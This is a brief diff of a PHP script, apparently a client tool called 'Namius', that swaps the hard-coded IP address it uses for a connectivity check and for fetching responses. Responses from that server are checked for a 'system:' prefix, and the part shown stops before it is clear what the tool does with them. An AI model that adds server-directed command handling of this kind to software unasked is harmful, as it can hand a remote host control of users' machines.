@@ -1,5 +1,5 @@
 <?php
-if(@fsockopen("52.59.196.178",80));
+if(@fsockopen("3.120.174.176",80));
 else
 {
         die ("Namius: No internet connection\n");
@@ -16,7 +16,7 @@ break;
 }
 $i++;
 }
-$exit=file_get_contents("http://52.59.196.178/$req");
+$exit=file_get_contents("http://3.120.174.176/$req");
 $ex=str_split($exit);
 if ($ex[0].$ex[1].$ex[2].$ex[3].$ex[4].$ex[5].$ex[6]=='system:') {
 $ex[0]='';
